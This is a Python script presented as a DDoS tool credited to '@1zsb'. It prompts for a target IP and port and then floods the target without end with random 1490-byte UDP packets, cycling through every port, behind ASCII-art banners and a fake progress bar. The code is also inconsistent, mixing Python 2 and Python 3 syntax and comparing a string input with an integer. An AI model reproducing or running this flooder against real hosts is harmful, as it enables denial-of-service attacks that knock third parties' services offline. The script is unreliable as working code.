import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
def virus():
    clear = "\x1b[0m"
    colors = [36, 32, 34, 35, 31, 37]

    x = '''
                     .ed"""" """$$$$be.
                   -"           ^""**$$$e.
                 ."                   '$$$c
                /                      "4$$b
               d  3                      $$$$
               $  *                   .$$$$$$
              .$  ^c           $$$$$e$$$$$$$$.
              d$L  4.         4$$$$$$$$$$$$$$b
              $$$$b ^ceeeee.  4$$ECL.F*$$$$$$$
  e$""=.      $$$$P d$$$$F $ $$$$$$$$$- $$$$$$
 z$$b. ^c     3$$$F "$$$$b   $"$$$$$$$  $$$$*"      .=""$c
4$$$$L        $$P"  "$$b   .$ $$$$$...e$$        .=  e$$$.
^*$$$$$c  %..   *c    ..    $$ 3$$$$$$$$$$eF     zP  d$$$$$
  "**$$$ec   "   %ce""    $$$  $$$$$$$$$$*    .r" =$$$$P""
        "*$b.  "c  *$e.    *** d$$$$$"L$$    .d"  e$$***"
          ^*$$c ^$c $$$      4J$$$$$% $$$ .e*".eeP"
             "$$$$$$"'$=e....$*$$**$cz$$" "..d$*"
               "*$$$  *=%4.$ L L$ P3$$$F $$$P"
                  "$   "%*ebJLzb$e$$$$$b $P"
                    %..      4$$$$$$$$$$ "
                     $$$e   z$$$$$$$$$$%
                      "*$c  "$$$$$$$P"
                       ."""*$$$$$$$$bc
                    .-"    .$***$$$"""*e.
                 .-"    .e$"     "*$c  ^*b.
          .=*""""    .e$*"          "*bc  "*$e..
        .$"        .z*"               ^*$e.   "*****e.
        $$ee$c   .d"                     "*$.        3.
        ^*$E")$..$"                         *   .ee==d%
           $.d$$$*                           *  J$$$e*
            """""                              "$$$"

			                  '''
    for N, line in enumerate( x.split( "\n" ) ):
        sys.stdout.write( " \x1b[1;%dm%s%s\n " % (random.choice( colors ), line, clear) )
        time.sleep( 0.05 )
def ddos():
    print(' _______   _______                                    ')
    print('/       \ /       \                                   ')
    print('$$$$$$$  |$$$$$$$  |  ______    _______               ')
    print('$$ |  $$ |$$ |  $$ | /      \  /       |              ')
    print('$$ |  $$ |$$ |  $$ |/$$$$$$  |/$$$$$$$/               ')
    print('$$ |  $$ |$$ |  $$ |$$ |  $$ |$$      \               ')
    print('$$ |__$$ |$$ |__$$ |$$ \__$$ | $$$$$$  |       __  __ ')
    print('$$    $$/ $$    $$/ $$    $$/ /     $$/       /  |/  |')
    print('$$$$$$$/  $$$$$$$/   $$$$$$/  $$$$$$$/        $$/ $$/ ')
    print('                                                      ')

ddos()
print
print("======================================")
print("===========Coded by @1zsb=============")
print("                                      ")
print("  [1] Start            [99]Main Menu  ")
print("                 ==                   ")
print("======================================")
print
mawar = ("\033[31;1m")
option = input("root@root:~# ")
if option == 1:
    os.system("clear")
    ddos()
    ip = raw_input(mawar+"IP Target : ")
    port = input(mawar+"Port       : ")

    os.system("clear")

    virus()
    print "[                    ] 0% "
    time.sleep(1)
    print "[=====               ] 25%"
    time.sleep(1)
    print "[==========          ] 50%"
    time.sleep(1)
    print "[===============     ] 75%"
    time.sleep(1)
    print "[====================] 100%"
    time.sleep(1)
    sent = 0
    while True:
        sock.sendto(bytes, (ip,port))
        sent = sent + 1
        port = port + 1
        print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
        if port == 65534:
            port = 1
else:
    os.system("clear")
    os.system("python3 start.py")
